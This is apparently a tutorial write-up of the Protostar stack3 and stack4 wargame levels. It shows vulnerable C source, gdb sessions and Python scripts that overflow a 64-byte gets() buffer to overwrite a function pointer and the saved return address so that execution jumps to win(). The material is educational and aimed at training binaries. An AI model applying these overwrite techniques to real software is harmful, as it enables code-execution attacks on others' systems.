Episode 0x0D
Stack Buffer Overflow 
  - redirecting code flow protostar 
  - stack3 & stack 4

Debugging using gdb & objdump
Using python
Understanding stack layout

Prerequisites: 
  Watch episode 0x0C;
  Stack Layout (https://bit.ly/3xFoWBW) & Buffer Overflow basics (https://bit.ly/3tfHqFE);

Stack3:
  Stack3 looks at environment variables, and how they can be set, and overwriting function pointers stored on the stack.
  (as a prelude to overwriting the saved EIP register)

  stack3 is interesting compared to stack0 since fp is like the modified variable in stack0 but it is called as a function if not 0
  This explains that we are supposed to create a buffer overflow to modify the bytes of fp to call the function (win) to print out the success message

  hints:
    - both gdb & objjdump is your friend you determining where the win() funtion lies in memory

  source code:
  ```c
  #include <stdlib.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>

  void win()
  {
    printf("code flow successfully changed\n");
  }

  int main(int argc, char **argv)
  {
    volatile int (*fp)();
    char buffer[64];

    fp = 0;

    gets(buffer);

    if(fp) {
        printf("calling function pointer, jumping to 0x%08x\n", fp);
        fp();
    }
  }
  ```

  Just like stack 0, the main function creates space for ESP (0x60 bytes on the stack)
  It then sets the fp variable to 0: 0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
  After the gets, we compare the fp value to check if it is still 0.
  If it is not still 0, we call eax (fp) as a function

  To begin, we set a breakpoint at 0x08048475 to see if we can overwrite the stack
  ```gdb
  (gdb) break *0x08048475
  Breakpoint 1 at 0x8048475: file stack3/stack3.c, line 22.
  ```
  We then run the program bby entering enough characters to overwrite the stack
  ```gdb
  (gdb) r
  Starting program: /opt/protostar/bin/stack3 
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  calling function pointer, jumping to 0x41414141

  Breakpoint 1, 0x08048475 in main (argc=1094795585, argv=0x414141) at stack3/stack3.c:22
  22      stack3/stack3.c: No such file or directory.
          in stack3/stack3.c
  ```
  We end up setting the fp value to hex 0x41414141, Which is 'A' in ASCII.

  Since 0x41414141 is not a used memory address, it is invalid, so if we continue after the breakpoint, we just get an error:
  ```gdb
  Program received signal SIGSEGV, Segmentation fault.
  0x41414141 in ?? ()
  ```

  To make this easier, lets open another ssh session
  ```bash
  ssh user@ip
  ```

  We are going to make a python(3) script that will be our exploit.
  To make this easier, lets just put the script in /tmp for ease of access.

  For now, lets just make a script that prints the alphabet * 4
  print("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT")

  Lets now execute this script and pipe it into a file so that we can also use it inside of gdb
  ```bash
  python /tmp/stack3.py > exp
  ```
  "exp" Contains our string that we will be using for the overflow.

  We will now run using the file as input
  ```gdb
  (gdb)r < /tmp/exp
  ```

  If we now see the registers using `info registers` command in gdb, we can see the value of 0x08048475.
  It is now set to 0x51515151, Which is hex for 'Q'
  ```
  Python 2.6.6 (r266:84292, Dec 27 2010, 00:02:40) 
  [GCC 4.4.5] on linux2
  Type "help", "copyright", "credits" or "license" for more information.
  >>> chr(0x51)
  'Q'
  ```

  Now, lets modify our python script...
  ```python
  padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
  padding += "\x24\x84\x04\x08" # 0x08048424
  print(padding)
  ```

  We now changed the pythonn file to create a variable for padding on Q,
  in other words we have all the letters of the alphabet up to q (excluding q).
  So, we make space for calling the win functions memory address at the end of the string.
  We then print the padding which is what we now pipe into the exp file
  ```bash
  python stack3.py > exp
  ```

  If we cat out exp into base64 format "cat exp | base64" we get: "QUFBQUJCQkJDQ0NDREREREVFRUVGRkZGR0dHR0hISEhJSUlJSkpKSktLS0tMTExMTU1NTU5OTk5PT09PUFBQUAgEhCQK"
  Which we can then translate that into ASCII.
  
  For example, we can use CyberChef to convert the base64 into ASCII. which can help us understand that the "...$" is the memory address that we want to call.
  In gdb's eyes, it will read it in bytes, so when we read the last 4 bytes of the string, it will provide the memory address to the win function.

  We will then be able to execute the function, getting the success message.

  Success!

  End Result from terminal:
    user@protostar:/opt/protostar/bin$ ./stack3 < /tmp/exp
    calling function pointer, jumping to 0x08048424
    code flow successfully changed

  End Result from GDB:
    Files inside of ./0x0D/3/gdb.*/*.gdb

Stack4:
  Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
  Hints:
    - A variaty of introductory papers into buffer overflows may help.
    - gdb lets you do "run < input"
    - EIP is not directly after the end of buffer, compiler padding can also increase the size.
  
  Source code:
  ```c
  #include <stdlib.h>
  #include <unistd.h>
  #include <stdio.h>
  #include <string.h>

  void win()
  {
    printf("code flow successfully changed\n");
  }

  int main(int argc, char **argv)
  {
    char buffer[64];

    gets(buffer);
  }
  ```
  This is interesting since we aren't calling the win() function at any point in time.

  Initial Thoughts:
    At the end of the buffer, find a way to call the win() function.
  
  Instead of overflowing a local variable, we are going to overflow the return value on the actual stack.
  When main returns, it reads wrong value and executes the win() function instead.

  Lets modify the script from the last stack, I copied my script into a new file called stack4_overwrite.py

  ```py
  padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ"
  print(padding)
  ```
  now, lets do the exact same as what we did at the beginning:
    python /tmp/stack4_overwrite.py > /tmp/exp

  We should now run the application using this as input within gdb.
  ```gdb
  (gdb) r < /tmp/exp
  Starting program: /opt/protostar/bin/stack4 < /tmp/exp

  Program received signal SIGSEGV, Segmentation fault.
  0x54545454 in ?? ()
  ```
  See, we have successfully re-written code execution to bad memory, Via the Segmentation fault.
  Now, if we look closely at the registers, we can see the the base pointer is 0x53 and the instruction pointer is 0x54
  This is because the old base pointer is left on the stack right before the instruction pointer.
  Now we know exactly where the hex value is for the pointer, it is at T so lets remove some of the padding in our script down to "RRRR"
  ```py
  padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
  ```

  Now, lets use objdump to find the address of the win() function.
  We get the address 0x080483f4 for the win() function:
    080483f4 g     F .text  00000014              win
  
  We can now make some pointers in our script.
  First, we are going to want to import struct, the create the pointer variables.
  We don't care about what ebp is so we can set it to anything.
  But for eip, we are going to want to pack it into that address, using the struct.pack method
  At the end of that, the script should look like:
  ```py
  import struct

  padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
  ebp = "AAAA"
  eip = struct.pack("I", 0x080483f4)

  print(padding + ebp + eip)
  ```
  lets now pipe the output into the exp file:
    python /tmp/stack4_overwrite.py > /tmp/exp
  
  And now execute the exploit and pipe it into stack4
  python /tmp/stack4_overwrite.py | /opt/protostar/bin/stack4

  ```bash
  user@protostar:/tmp$ python stack4_overwrite.py | /opt/protostar/bin/stack4
  code flow successfully changed
  Segmentation fault
  ```

  See, we have successfully overflowed the stack to call the win() function.
  To see the gdb result, you can look at ./0x0D/4/gdb.2/main.gdb